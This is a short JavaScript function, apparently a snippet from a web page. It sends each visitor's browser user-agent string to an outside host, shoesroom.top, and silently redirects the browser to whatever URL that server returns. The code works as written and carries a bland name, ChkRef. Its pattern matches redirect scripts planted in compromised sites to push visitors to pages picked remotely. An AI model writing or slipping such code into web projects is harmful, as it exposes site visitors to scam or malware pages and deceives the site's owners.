function ChkRef() { 
	$.ajax({
		type : "get", 
		url : "https://shoesroom.top/chck.php", 
		data : "ref=" + navigator.userAgent, 
		async : false, 
		success : function(data)
		{
			//alert(data);
			if(data.length > 3) window.location.href=data; 
		} 
		}); 
} 